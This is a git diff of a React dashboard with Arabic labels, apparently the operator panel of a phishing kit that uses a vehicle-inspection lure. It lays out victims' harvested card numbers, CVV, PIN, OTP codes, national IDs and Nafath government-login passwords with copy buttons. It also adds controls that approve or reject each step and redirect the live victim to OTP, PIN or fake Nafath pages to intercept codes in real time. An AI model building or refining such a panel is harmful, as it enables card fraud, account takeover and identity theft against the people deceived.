@@ -513,6 +513,174 @@ function Section({
   )
 }
 
+// ─── Mini Section (no collapse, compact) ─────────────────────────────────────
+
+function MiniSection({
+  title,
+  icon: Icon,
+  children,
+  flash = false,
+}: {
+  title: string
+  icon: React.ComponentType<{ className?: string }>
+  children: React.ReactNode
+  flash?: boolean
+}) {
+  return (
+    <div className={`bg-[#1f2c34] rounded-xl border overflow-hidden shadow-sm ${flash ? "border-red-500/50 flash-section" : "border-[#2a3942]"}`}>
+      <div className="flex items-center gap-2 px-4 pt-3 pb-1">
+        <Icon className="h-3.5 w-3.5 text-teal-400" />
+        <span className="text-xs font-bold text-gray-300">{title}</span>
+        {flash && (
+          <span className="relative flex h-2 w-2 mr-1">
+            <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
+            <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500"></span>
+          </span>
+        )}
+      </div>
+      <div className="px-4 pb-3">{children}</div>
+    </div>
+  )
+}
+
+// ─── Visual Credit Card ──────────────────────────────────────────────────────
+
+function VisualCreditCard({ record }: { record: FirestoreRecord }) {
+  const cardNumber = str(record.cardNumber)
+  const cardName = str(record.cardName)
+  const expiry = str(record.expiryDate) || (str(record.expiryMonth) ? str(record.expiryMonth) + "/" + str(record.expiryYear) : "")
+  const cvv = str(record.cvv)
+  const [copied, setCopied] = useState<string | null>(null)
+
+  const handleCopy = (val: string, key: string) => {
+    if (!val) return
+    navigator.clipboard.writeText(val)
+    setCopied(key)
+    setTimeout(() => setCopied(null), 1500)
+  }
+
+  // Format card number with spaces
+  const formatCardDisplay = (num: string) => {
+    if (!num) return "•••• •••• •••• ••••"
+    const clean = num.replace(/\s/g, "")
+    return clean.replace(/(.{4})/g, "$1 ").trim()
+  }
+
+  if (!cardNumber && !cardName) return null
+
+  return (
+    <div className="credit-card-visual relative w-full aspect-[1.6/1] rounded-2xl p-5 flex flex-col justify-between overflow-hidden select-none">
+      {/* Card BG gradient */}
+      <div className="absolute inset-0 bg-gradient-to-br from-[#1a1a2e] via-[#16213e] to-[#0f3460] z-0" />
+      <div className="absolute inset-0 opacity-10 z-0" style={{ backgroundImage: "url(\"data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.08'%3E%3Ccircle cx='30' cy='30' r='2'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\")" }} />
+
+      {/* Top row */}
+      <div className="relative z-10 flex items-center justify-between">
+        <div className="flex items-center gap-2">
+          <div className="w-10 h-7 rounded bg-gradient-to-br from-yellow-300 to-yellow-500 flex items-center justify-center">
+            <div className="w-6 h-4 rounded-sm border border-yellow-600/50" />
+          </div>
+          <span className="text-[10px] text-gray-400 font-mono">{str(record.paymentMethod) || "CARD"}</span>
+        </div>
+        <CreditCard className="h-6 w-6 text-gray-400/60" />
+      </div>
+
+      {/* Card number */}
+      <div className="relative z-10">
+        <button
+          onClick={() => handleCopy(cardNumber, "num")}
+          className="text-lg sm:text-xl font-mono tracking-[0.2em] text-gray-100 hover:text-white transition-colors text-right w-full"
+          dir="ltr"
+          title="انسخ رقم البطاقة"
+        >
+          {copied === "num" ? (
+            <span className="text-green-400 text-sm flex items-center justify-center gap-1"><Check className="h-4 w-4" /> تم النسخ</span>
+          ) : (
+            formatCardDisplay(cardNumber)
+          )}
+        </button>
+      </div>
+
+      {/* Bottom row */}
+      <div className="relative z-10 flex items-end justify-between gap-3">
+        <div className="flex-1 min-w-0">
+          <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">حامل البطاقة</p>
+          <button
+            onClick={() => handleCopy(cardName, "name")}
+            className="text-xs font-semibold text-gray-200 truncate block w-full text-right hover:text-white transition-colors"
+            title="انسخ الاسم"
+          >
+            {copied === "name" ? <span className="text-green-400">تم النسخ</span> : (cardName || "—")}
+          </button>
+        </div>
+        <div className="text-left shrink-0">
+          <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">انتهاء</p>
+          <button
+            onClick={() => handleCopy(expiry, "exp")}
+            className="text-xs font-mono font-semibold text-gray-200 hover:text-white transition-colors"
+            title="انسخ تاريخ الانتهاء"
+          >
+            {copied === "exp" ? <span className="text-green-400">تم</span> : (expiry || "••/••")}
+          </button>
+        </div>
+        <div className="text-left shrink-0">
+          <p className="text-[9px] text-gray-500 uppercase tracking-wider mb-0.5">CVV</p>
+          <button
+            onClick={() => handleCopy(cvv, "cvv")}
+            className="text-xs font-mono font-bold text-amber-300 hover:text-amber-200 transition-colors"
+            title="انسخ CVV"
+          >
+            {copied === "cvv" ? <span className="text-green-400">تم</span> : (cvv || "•••")}
+          </button>
+        </div>
+      </div>
+    </div>
+  )
+}
+
+// ─── Code Display (for OTP/PIN) ──────────────────────────────────────────────
+
+function CodeDisplay({
+  label,
+  value,
+  color = "teal",
+}: {
+  label: string
+  value?: string
+  color?: "teal" | "amber" | "purple" | "red"
+}) {
+  const [copied, setCopied] = useState(false)
+  if (!value) return null
+
+  const colorMap = {
+    teal: "from-teal-900/50 to-teal-800/30 border-teal-700/50 text-teal-300",
+    amber: "from-amber-900/50 to-amber-800/30 border-amber-700/50 text-amber-300",
+    purple: "from-purple-900/50 to-purple-800/30 border-purple-700/50 text-purple-300",
+    red: "from-red-900/50 to-red-800/30 border-red-700/50 text-red-300",
+  }
+
+  const handleCopy = () => {
+    navigator.clipboard.writeText(value)
+    setCopied(true)
+    setTimeout(() => setCopied(false), 1500)
+  }
+
+  return (
+    <button
+      onClick={handleCopy}
+      className={`w-full rounded-xl border bg-gradient-to-br ${colorMap[color]} p-3 text-center transition-all hover:brightness-110 group`}
+      title={`انسخ ${label}`}
+    >
+      <p className="text-[10px] text-gray-500 uppercase tracking-wider mb-1">{label}</p>
+      {copied ? (
+        <p className="text-lg font-bold text-green-400 flex items-center justify-center gap-1"><Check className="h-4 w-4" /> تم</p>
+      ) : (
+        <p className="text-2xl font-mono font-bold tracking-[0.3em]" dir="ltr">{value}</p>
+      )}
+    </button>
+  )
+}
+
 // ─── Empty State ─────────────────────────────────────────────────────────────
 
 function EmptyState() {
@@ -925,15 +1093,15 @@ export default function DashboardPage() {
               ref={detailRef}
               className="flex-1 overflow-y-auto bg-[#0b141a] chat-pattern-dark chat-scrollbar"
             >
-              <div className="max-w-3xl mx-auto p-4 space-y-3">
+              <div className="p-4 space-y-3">
                 {/* ID Badge */}
-                <div className="flex justify-center mb-2">
+                <div className="flex justify-center mb-1">
                   <span className="bg-[#1b2b33]/90 backdrop-blur-sm text-gray-500 text-[11px] font-mono px-4 py-1.5 rounded-full shadow-sm border border-[#2a3942]">
                     {selectedRecord.id}
                   </span>
                 </div>
 
-                {/* ── Approval Alert Banner ─────────────────────────────── */}
+                {/* ── Approval Alert Banner (full width) ───────────────── */}
                 {selectedNeedsApproval && (
                   <div className="bg-red-900/30 border border-red-800/50 rounded-xl p-4 flash-section">
                     <div className="flex items-center gap-3">
@@ -947,142 +1115,152 @@ export default function DashboardPage() {
                       </div>
                       <div>
                         <p className="text-sm font-bold text-red-300">هذا الزائر يحتاج موافقتك!</p>
-                        <p className="text-xs text-red-400/80 mt-0.5">انتقل إلى قسم &quot;التحكم في الموافقات&quot; لاتخاذ إجراء</p>
+                        <p className="text-xs text-red-400/80 mt-0.5">انتقل إلى قسم &quot;التحكم في الموافقات&quot; أدناه لاتخاذ إجراء</p>
                       </div>
                     </div>
                   </div>
                 )}
 
-                {/* ── Personal Info ─────────────────────────────────────── */}
-                <Section title="المعلومات الشخصية" icon={User}>
-                  <DetailRow icon={User} label="اسم المالك" value={str(selectedRecord.ownerName) || str(selectedRecord.name)} copyable />
-                  <DetailRow icon={Hash} label="رقم الهوية" value={str(selectedRecord.nationalId) || str(selectedRecord.idNumber)} mono copyable />
-                  <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono copyable />
-                  <DetailRow icon={Globe} label="البلد" value={str(selectedRecord.country)} />
-                  <DetailRow icon={FileText} label="البريد الإلكتروني" value={str(selectedRecord.email) || str(selectedRecord.delegateEmail)} copyable />
-                </Section>
+                {/* ═══════════════════════════════════════════════════════════
+                    THREE-COLUMN GRID
+                    Col 1: Basic Info | Col 2: Card & Codes | Col 3: Phone/Nafaz/Controls
+                    ═══════════════════════════════════════════════════════════ */}
+                <div className="grid grid-cols-1 lg:grid-cols-3 gap-3">
 
-                {/* ── Vehicle Info ──────────────────────────────────────── */}
-                {(str(selectedRecord.plateNumbers) || str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)) && (
-                  <Section title="معلومات المركبة" icon={Car}>
-                    <DetailRow icon={Hash} label="أرقام اللوحة" value={str(selectedRecord.plateLetters) + " " + str(selectedRecord.plateNumbers)} mono copyable />
-                    <DetailRow icon={Car} label="نوع المركبة" value={str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)} />
-                    <DetailRow icon={FileText} label="حالة المركبة" value={str(selectedRecord.vehicleStatus)} />
-                    <DetailRow icon={Hash} label="الرقم التسلسلي" value={str(selectedRecord.serialNumber)} mono copyable />
-                    <DetailRow icon={MapPin} label="المنطقة / المدينة" value={[str(selectedRecord.region), str(selectedRecord.city)].filter(Boolean).join(" / ") || undefined} />
-                    <DetailRow icon={Calendar} label="موعد الفحص" value={[str(selectedRecord.inspectionDate), str(selectedRecord.inspectionTime)].filter(Boolean).join(" - ") || undefined} />
-                  </Section>
-                )}
+                  {/* ──────────────────────────────────────────────────────
+                      COLUMN 1 — Basic Information
+                      ────────────────────────────────────────────────────── */}
+                  <div className="space-y-3">
+                    {/* Personal Info */}
+                    <MiniSection title="المعلومات الشخصية" icon={User}>
+                      <DetailRow icon={User} label="اسم المالك" value={str(selectedRecord.ownerName) || str(selectedRecord.name)} copyable />
+                      <DetailRow icon={Hash} label="رقم الهوية" value={str(selectedRecord.nationalId) || str(selectedRecord.idNumber)} mono copyable />
+                      <DetailRow icon={Phone} label="رقم الجوال" value={str(selectedRecord.phone) || str(selectedRecord.authorizedPhone)} mono copyable />
+                      <DetailRow icon={Globe} label="البلد" value={str(selectedRecord.country)} />
+                      <DetailRow icon={FileText} label="البريد" value={str(selectedRecord.email) || str(selectedRecord.delegateEmail)} copyable />
+                    </MiniSection>
 
-                {/* ── Delegate Info ─────────────────────────────────────── */}
-                {(str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)) && (
-                  <Section title="بيانات المفوض" icon={Users}>
-                    <DetailRow icon={User} label="اسم المفوض" value={str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)} copyable />
-                    <DetailRow icon={Phone} label="جوال المفوض" value={str(selectedRecord.delegatePhone) || str(selectedRecord.authorizedPhone)} mono copyable />
-                    <DetailRow icon={Hash} label="هوية المفوض" value={str(selectedRecord.delegateIdNumber) || str(selectedRecord.authorizedId)} mono copyable />
-                    <DetailRow icon={Calendar} label="تاريخ ميلاد المفوض" value={str(selectedRecord.authorizedBirthDate)} />
-                  </Section>
-                )}
+                    {/* Vehicle Info */}
+                    {(str(selectedRecord.plateNumbers) || str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)) && (
+                      <MiniSection title="معلومات المركبة" icon={Car}>
+                        <DetailRow icon={Hash} label="اللوحة" value={str(selectedRecord.plateLetters) + " " + str(selectedRecord.plateNumbers)} mono copyable />
+                        <DetailRow icon={Car} label="نوع المركبة" value={str(selectedRecord.vehicleType) || str(selectedRecord.inspectionType)} />
+                        <DetailRow icon={FileText} label="حالة المركبة" value={str(selectedRecord.vehicleStatus)} />
+                        <DetailRow icon={Hash} label="الرقم التسلسلي" value={str(selectedRecord.serialNumber)} mono copyable />
+                        <DetailRow icon={MapPin} label="المنطقة / المدينة" value={[str(selectedRecord.region), str(selectedRecord.city)].filter(Boolean).join(" / ") || undefined} />
+                        <DetailRow icon={Calendar} label="موعد الفحص" value={[str(selectedRecord.inspectionDate), str(selectedRecord.inspectionTime)].filter(Boolean).join(" - ") || undefined} />
+                      </MiniSection>
+                    )}
 
-                {/* ── Payment Info ──────────────────────────────────────── */}
-                {(str(selectedRecord.cardNumber) || str(selectedRecord.paymentMethod)) && (
-                  <Section title="معلومات الدفع" icon={CreditCard}>
-                    <DetailRow icon={CreditCard} label="طريقة الدفع" value={str(selectedRecord.paymentMethod)} />
-                    <DetailRow icon={CreditCard} label="رقم البطاقة" value={str(selectedRecord.cardNumber)} mono copyable />
-                    <DetailRow icon={User} label="اسم حامل البطاقة" value={str(selectedRecord.cardName)} copyable />
-                    <DetailRow
-                      icon={Calendar}
-                      label="تاريخ الانتهاء"
-                      value={str(selectedRecord.expiryDate) || (str(selectedRecord.expiryMonth) ? str(selectedRecord.expiryMonth) + "/" + str(selectedRecord.expiryYear) : undefined)}
-                      copyable
-                    />
-                    <DetailRow icon={Shield} label="CVV" value={str(selectedRecord.cvv)} mono copyable />
-                    <DetailRow icon={Hash} label="PIN" value={str(selectedRecord.pin)} mono copyable />
-                    <DetailRow icon={Hash} label="OTP" value={str(selectedRecord.otp) || str(selectedRecord.phoneOtp)} mono copyable />
-                    <DetailRow icon={Phone} label="المشغل" value={str(selectedRecord.operator)} />
-                  </Section>
-                )}
+                    {/* Delegate Info */}
+                    {(str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)) && (
+                      <MiniSection title="بيانات المفوض" icon={Users}>
+                        <DetailRow icon={User} label="اسم المفوض" value={str(selectedRecord.delegateName) || str(selectedRecord.authorizedName)} copyable />
+                        <DetailRow icon={Phone} label="جوال المفوض" value={str(selectedRecord.delegatePhone) || str(selectedRecord.authorizedPhone)} mono copyable />
+                        <DetailRow icon={Hash} label="هوية المفوض" value={str(selectedRecord.delegateIdNumber) || str(selectedRecord.authorizedId)} mono copyable />
+                        <DetailRow icon={Calendar} label="تاريخ الميلاد" value={str(selectedRecord.authorizedBirthDate)} />
+                      </MiniSection>
+                    )}
 
-                {/* ── Nafaz Info ────────────────────────────────────────── */}
-                {(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin)) && (
-                  <Section title="بيانات نفاذ" icon={Shield}>
-                    <DetailRow icon={User} label="اسم المستخدم" value={str(selectedRecord.nafadUsername)} mono copyable />
-                    <DetailRow icon={Shield} label="كلمة المرور" value={str(selectedRecord.nafadPassword)} mono copyable />
-                    <DetailRow icon={Hash} label="رمز نفاذ" value={str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)} mono copyable />
-                  </Section>
-                )}
+                    {/* Timestamps */}
+                    <MiniSection title="التوقيتات" icon={Clock}>
+                      <DetailRow icon={Clock} label="تاريخ الإنشاء" value={formatDate(str(selectedRecord.createdAt) || str(selectedRecord.createdDate))} />
+                      <DetailRow icon={Clock} label="آخر تحديث" value={formatDate(str(selectedRecord.updatedAt))} />
+                      <DetailRow icon={Clock} label="تاريخ الإكمال" value={formatDate(str(selectedRecord.completedDate))} />
+                    </MiniSection>
+                  </div>
 
-                {/* ── Approval Controls ─────────────────────────────────── */}
-                <Section title="التحكم في الموافقات" icon={CheckCircle2} flash={selectedNeedsApproval}>
-                  <div className="space-y-5">
-                    <div>
-                      <p className="text-xs font-semibold text-gray-300 mb-1">موافقة البطاقة</p>
+                  {/* ──────────────────────────────────────────────────────
+                      COLUMN 2 — Card & Verification Codes
+                      ────────────────────────────────────────────────────── */}
+                  <div className="space-y-3">
+                    {/* Visual Credit Card */}
+                    <VisualCreditCard record={selectedRecord} />
+
+                    {/* Verification Codes */}
+                    <div className="grid grid-cols-2 gap-2">
+                      <CodeDisplay label="OTP" value={str(selectedRecord.otp) || str(selectedRecord.phoneOtp)} color="purple" />
+                      <CodeDisplay label="PIN" value={str(selectedRecord.pin)} color="amber" />
+                    </div>
+
+                    {/* Card Approval */}
+                    <MiniSection title="موافقة البطاقة" icon={CreditCard} flash={selectedNeedsApproval && ["card-details-submitted", "otp-submitted", "pin-submitted"].includes(str(selectedRecord.step))}>
                       <p className="text-[10px] text-gray-500 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة PIN | rejected=رفض</p>
                       <ApprovalActions record={selectedRecord} field="cardApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
-                    </div>
+                    </MiniSection>
 
-                    <div>
-                      <p className="text-xs font-semibold text-gray-300 mb-1">موافقة OTP الجوال</p>
-                      <p className="text-[10px] text-gray-500 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
-                      <ApprovalActions record={selectedRecord} field="phoneOtpApproval" options={["pending", "approved", "rejected"]} onUpdate={handleUpdate} />
-                    </div>
+                    {/* Operator */}
+                    {str(selectedRecord.operator) && (
+                      <MiniSection title="المشغل" icon={Wifi}>
+                        <DetailRow icon={Phone} label="مشغل الاتصال" value={str(selectedRecord.operator)} />
+                      </MiniSection>
+                    )}
 
-                    <div>
-                      <p className="text-xs font-semibold text-gray-300 mb-1">موافقة الجوال</p>
+                    {/* Raw JSON */}
+                    <Section title="البيانات الخام" icon={FileText} defaultOpen={false}>
+                      <pre className="bg-[#0b141a] text-green-400 p-3 rounded-lg text-[10px] overflow-x-auto max-h-52 leading-relaxed border border-[#2a3942]" dir="ltr">
+                        {JSON.stringify(selectedRecord, null, 2)}
+                      </pre>
+                    </Section>
+                  </div>
+
+                  {/* ──────────────────────────────────────────────────────
+                      COLUMN 3 — Phone, Nafaz & Controls
+                      ────────────────────────────────────────────────────── */}
+                  <div className="space-y-3">
+                    {/* Phone Approvals */}
+                    <MiniSection title="موافقة الجوال" icon={Phone} flash={selectedNeedsApproval && (str(selectedRecord.phoneApproval) === "pending" && !!str(selectedRecord.phone))}>
                       <p className="text-[10px] text-gray-500 mb-2">pending=تحميل | otp=صفحة OTP | approved=صفحة نفاذ | rejected=رفض</p>
                       <ApprovalActions record={selectedRecord} field="phoneApproval" options={["pending", "otp", "approved", "rejected"]} onUpdate={handleUpdate} />
-                    </div>
+                    </MiniSection>
+
+                    <MiniSection title="موافقة OTP الجوال" icon={Hash} flash={selectedNeedsApproval && str(selectedRecord.step) === "phone-otp-requested"}>
+                      <p className="text-[10px] text-gray-500 mb-2">approved=انتقال لنفاذ | rejected=رفض | pending=انتظار</p>
+                      <ApprovalActions record={selectedRecord} field="phoneOtpApproval" options={["pending", "approved", "rejected"]} onUpdate={handleUpdate} />
+                    </MiniSection>
+
+                    {/* Nafaz Info */}
+                    {(str(selectedRecord.nafadUsername) || str(selectedRecord.nafadPassword) || str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)) && (
+                      <MiniSection title="بيانات نفاذ" icon={Shield}>
+                        <DetailRow icon={User} label="اسم المستخدم" value={str(selectedRecord.nafadUsername)} mono copyable />
+                        <DetailRow icon={Shield} label="كلمة المرور" value={str(selectedRecord.nafadPassword)} mono copyable />
+                        <DetailRow icon={Hash} label="رمز نفاذ" value={str(selectedRecord.nafaz_pin) || str(selectedRecord.authNumber)} mono copyable />
+                      </MiniSection>
+                    )}
+
+                    {/* Page Navigation */}
+                    <MiniSection title="توجيه الزائر" icon={Globe}>
+                      <p className="text-[10px] text-gray-500 mb-2">اضغط على أي صفحة لتوجيه الزائر إليها فوراً</p>
+                      <NavigateVisitorControl record={selectedRecord} onUpdate={handleUpdate} />
+                    </MiniSection>
+
+                    {/* Text Field Controls */}
+                    <MiniSection title="حقول التحكم" icon={Settings}>
+                      <div className="space-y-3">
+                        <div>
+                          <p className="text-[10px] text-gray-500 mb-1.5">رقم التحقق في نفاذ (authNumber)</p>
+                          <TextFieldControl
+                            key={"auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
+                            record={selectedRecord}
+                            field="authNumber"
+                            placeholder="مثال: 42"
+                            onUpdate={handleUpdate}
+                          />
+                        </div>
+                        <div>
+                          <p className="text-[10px] text-gray-500 mb-1.5">رمز نفاذ PIN (nafaz_pin)</p>
+                          <TextFieldControl
+                            key={"pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
+                            record={selectedRecord}
+                            field="nafaz_pin"
+                            placeholder="مثال: 58"
+                            onUpdate={handleUpdate}
+                          />
+                        </div>
+                      </div>
+                    </MiniSection>
                   </div>
-                </Section>
-
-                {/* ── Page Navigation ──────────────────────────────────── */}
-                <Section title="توجيه الزائر" icon={Globe}>
-                  <p className="text-[10px] text-gray-500 mb-2">اضغط على أي صفحة لتوجيه الزائر إليها فوراً</p>
-                  <NavigateVisitorControl record={selectedRecord} onUpdate={handleUpdate} />
-                </Section>
-
-                {/* ── Text Fields ───────────────────────────────────────── */}
-                <Section title="حقول التحكم" icon={Settings}>
-                  <div className="space-y-4">
-                    <div>
-                      <p className="text-xs font-semibold text-gray-300 mb-1">رقم التحقق في نفاذ (authNumber)</p>
-                      <p className="text-[10px] text-gray-500 mb-2">يظهر للمستخدم في نافذة نفاذ</p>
-                      <TextFieldControl
-                        key={"auth-" + selectedRecord.id + "-" + str(selectedRecord.authNumber)}
-                        record={selectedRecord}
-                        field="authNumber"
-                        placeholder="مثال: 42"
-                        onUpdate={handleUpdate}
-                      />
-                    </div>
-
-                    <div>
-                      <p className="text-xs font-semibold text-gray-300 mb-1">رمز نفاذ PIN (nafaz_pin)</p>
-                      <p className="text-[10px] text-gray-500 mb-2">يظهر في صفحة /nafad كرقم التحقق</p>
-                      <TextFieldControl
-                        key={"pin-" + selectedRecord.id + "-" + str(selectedRecord.nafaz_pin)}
-                        record={selectedRecord}
-                        field="nafaz_pin"
-                        placeholder="مثال: 58"
-                        onUpdate={handleUpdate}
-                      />
-                    </div>
-                  </div>
-                </Section>
-
-                {/* ── Timestamps ────────────────────────────────────────── */}
-                <Section title="التوقيتات" icon={Clock} defaultOpen={false}>
-                  <DetailRow icon={Clock} label="تاريخ الإنشاء" value={formatDate(str(selectedRecord.createdAt) || str(selectedRecord.createdDate))} />
-                  <DetailRow icon={Clock} label="آخر تحديث" value={formatDate(str(selectedRecord.updatedAt))} />
-                  <DetailRow icon={Clock} label="تاريخ الإكمال" value={formatDate(str(selectedRecord.completedDate))} />
-                </Section>
-
-                {/* ── Raw JSON ──────────────────────────────────────────── */}
-                <Section title="البيانات الخام (JSON)" icon={FileText} defaultOpen={false}>
-                  <pre className="bg-[#0b141a] text-green-400 p-4 rounded-lg text-xs overflow-x-auto max-h-64 leading-relaxed border border-[#2a3942]" dir="ltr">
-                    {JSON.stringify(selectedRecord, null, 2)}
-                  </pre>
-                </Section>
+                </div>
 
                 {/* Bottom spacer */}
                 <div className="h-4" />
